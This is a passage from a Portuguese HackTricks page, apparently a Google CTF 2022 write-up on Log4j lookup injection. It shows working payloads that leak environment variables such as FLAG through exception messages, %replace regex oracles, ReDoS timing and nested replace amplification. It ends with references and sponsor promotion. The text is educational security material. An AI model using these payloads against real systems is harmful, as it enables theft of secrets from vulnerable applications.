No CTF, voc√™ **n√£o podia acessar o stderr** da aplica√ß√£o java usando log4J, mas as **exce√ß√µes do Log4J s√£o enviadas para stdout**, que era impresso no aplicativo python. Isso significava que, ao provocar uma exce√ß√£o, poder√≠amos acessar o conte√∫do. Uma exce√ß√£o para exfiltrar a flag era: **`${java:${env:FLAG}}`.** Isso funciona porque **`${java:CTF{blahblah}}`** n√£o existe e uma exce√ß√£o com o valor da flag ser√° mostrada:

![](<../../.gitbook/assets/image (157).png>)

### Exce√ß√µes de Padr√µes de Convers√£o

S√≥ para mencionar, voc√™ tamb√©m poderia injetar novos [**padr√µes de convers√£o**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) e provocar exce√ß√µes que seriam registradas no `stdout`. Por exemplo:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Isso n√£o foi considerado √∫til para exfiltrar dados dentro da mensagem de erro, porque a consulta n√£o era resolvida antes do padr√£o de convers√£o, mas poderia ser √∫til para outras coisas, como detec√ß√£o.

### Regexes de Padr√µes de Convers√£o

No entanto, √© poss√≠vel usar alguns **padr√µes de convers√£o que suportam regexes** para exfiltrar informa√ß√µes de uma consulta usando regexes e abusando de comportamentos de **busca bin√°ria** ou **baseados em tempo**.

* **Busca bin√°ria via mensagens de exce√ß√£o**

O padr√£o de convers√£o **`%replace`** pode ser usado para **substituir** **conte√∫do** de uma **string** at√© mesmo usando **regexes**. Funciona assim: `replace{pattern}{regex}{substitution}`\
Abusando desse comportamento, voc√™ poderia fazer com que o replace **acionasse uma exce√ß√£o se o regex correspondesse** a algo dentro da string (e nenhuma exce√ß√£o se n√£o fosse encontrado) assim:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Baseado em tempo**

Como mencionado na se√ß√£o anterior, **`%replace`** suporta **regexes**. Assim, √© poss√≠vel usar um payload da [**p√°gina ReDoS**](../regular-expression-denial-of-service-redos.md) para causar um **timeout** caso a flag seja encontrada.\
Por exemplo, um payload como `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` acionaria um **timeout** nesse CTF.

Neste [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), em vez de usar um ataque ReDoS, foi utilizado um **ataque de amplifica√ß√£o** para causar uma diferen√ßa de tempo na resposta:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Se a flag come√ßar com `flagGuess`, toda a flag √© substitu√≠da por 29 `#` (usei este caractere porque provavelmente n√£o faria parte da flag). **Cada um dos 29 `#` resultantes √© ent√£o substitu√≠do por 54 `#`**. Esse processo √© repetido **6 vezes**, levando a um total de `29*54*54^6* =`` `` `**`96816014208`  `#`-s!**
>
> Substituir tantos `#` acionar√° o timeout de 10 segundos da aplica√ß√£o Flask, o que, por sua vez, resultar√° no c√≥digo de status HTTP 500 sendo enviado ao usu√°rio. (Se a flag n√£o come√ßar com `flagGuess`, receberemos um c√≥digo de status diferente de 500)

## Refer√™ncias

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que mais importam para que voc√™ possa corrigi-las mais rapidamente. Intruder rastreia sua superf√≠cie de ataque, executa varreduras proativas de amea√ßas, encontra problemas em toda a sua pilha tecnol√≥gica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Aprenda hacking em AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
